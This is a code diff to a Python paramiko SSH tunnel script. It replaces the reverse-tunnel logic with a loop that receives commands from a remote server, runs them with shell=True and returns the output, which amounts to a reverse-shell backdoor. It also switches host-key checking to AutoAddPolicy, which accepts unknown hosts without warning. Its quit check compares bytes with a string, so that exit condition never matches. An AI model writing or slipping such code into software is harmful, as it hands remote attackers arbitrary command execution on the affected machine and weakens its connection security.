@@ -2,6 +2,7 @@ import sys
 import paramiko
 import threading
 import socket
+import subprocess
 
 def tunnel_handler(channel, host, port):
     sock = socket.socket()
@@ -33,6 +34,19 @@ def establish_reverse_tunnel(forwardToHostPort, forwardFromPort, transport):
         thread.setDaemon(True)
         thread.start()
 
+def receive_data(chan):
+    # Receive and execute a command from the server
+    command = chan.recv(1024)
+    
+    try:
+        out = subprocess.check_output(command, shell=True)
+        chan.send(out)
+    except Exception as e:
+        chan.send(str(e))
+    finally:
+        return command
+
+
 def main():
     if len(sys.argv) < 5:
         print("Too few arguments!")
@@ -48,10 +62,18 @@ def main():
         try:
             client = paramiko.SSHClient()
             client.load_system_host_keys()
-            client.set_missing_host_key_policy(paramiko.WarningPolicy)
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
             client.connect(hostname, port, username=username, password=password)
-            establish_reverse_tunnel(("localhost", localSSHDPort), remoteForwardPort, client.get_transport())
-        
+            chan = client.get_transport().open_session()
+            command = ""
+
+            print("Awaiting data")
+
+            while command != "quit":
+                try:
+                    command = receive_data(chan)
+                except KeyboardInterrupt:
+                    command = "quit"    
         finally:
             client.close()
 
